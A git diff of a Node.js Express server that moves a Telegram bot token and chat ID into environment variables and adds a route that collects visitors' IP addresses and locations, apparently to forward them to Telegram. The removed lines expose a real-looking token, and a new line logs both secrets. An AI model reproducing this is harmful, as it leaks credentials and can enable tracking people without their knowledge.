@@ -1,4 +1,5 @@
 // server.js
+require('dotenv').config();
 const express = require("express");
 const bodyParser = require("body-parser");
 const cors = require("cors");
@@ -18,9 +19,16 @@ app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
 });
 
-const TELEGRAM_BOT_TOKEN = "7659298885:AAEJkBqDsVvQLI5zapTjtLpqpljREgHCTr0"; // Substitua pelo token do seu bot
-const TELEGRAM_CHAT_ID = "1429326870"; // Substitua pelo ID do chat (ou grupo) para onde quer enviar
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN; // Substitua pelo token do seu bot
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // Substitua pelo ID do chat (ou grupo) para onde quer enviar
+console.log(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
 
+app.get('/env.js', (req, res) => {
+  res.type('application/javascript');
+  res.send(`window.env = {
+    ENDPOINT_URL: "${process.env.ENDPOINT_URL}"
+  };`);
+});
 app.post("/send-location", async (req, res) => {
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   console.log("Localização recebida:");
